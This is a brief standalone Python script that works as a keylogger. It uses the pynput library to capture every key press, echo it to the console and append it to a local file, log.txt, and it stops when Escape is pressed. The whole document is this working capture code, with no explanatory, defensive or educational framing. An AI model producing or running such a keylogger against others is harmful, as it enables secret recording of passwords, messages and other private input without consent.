
#!/usr/bin/env python3

from pynput.keyboard import Key, Listener


previous = ""


def on_press(key):
    print(key)
    write_to_file(key)


def write_to_file(key):
    with open("log.txt", "a+") as f:
        print(f)
        k = check_input(f, key)
        f.write(k)


def check_input(f, key):
    global previous
    k = str(key)
    if k.startswith("Key."):
        f.write("\n")
    else:
        if previous.startswith("Key."):
            f.write("\n")
    if k.startswith("'") and k.endswith("'") and len(k) == 3:
        k = k[1:-1]
    elif k.startswith("\"") and k.endswith("\"") and len(k) == 3:
        k = k[1:-1]
    previous = k
    return k


def on_release(key):
    if key == Key.esc:
        return False


with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
